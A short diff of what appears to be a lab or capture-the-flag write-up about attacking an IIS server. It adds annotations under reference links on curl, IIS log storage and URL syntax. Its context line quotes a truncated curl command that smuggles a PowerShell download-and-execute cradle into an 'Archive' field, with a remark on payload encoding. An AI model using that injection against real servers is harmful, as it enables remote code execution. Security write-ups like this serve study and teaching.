@@ -253,8 +253,6 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 When encoding payloads it looks like they encoded special characters, spaces... really everything except for the words and ('s )'s
 
-
-
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
@@ -343,6 +341,11 @@ https://en.wikipedia.org/wiki/Directory_traversal_attack
 https://www.php.net/manual/en/reserved.variables.get.php
 https://portswigger.net/burp
 https://curl.se/
+	curl, aka libcurl, is used in cars, tvs, routers, printers, phones....
 https://en.wikipedia.org/wiki/Internet_Information_Services
+	no notes
 https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage
+	logs can be stored on another server, either same domain or different domain, and managed remotely.
 https://www.ietf.org/rfc/rfc1738.txt
+	describes the syntax and semantics for a compact string representation for a resource available via the Internet.  These strings are called "Uniform Resource Locators" (URLs).
+	
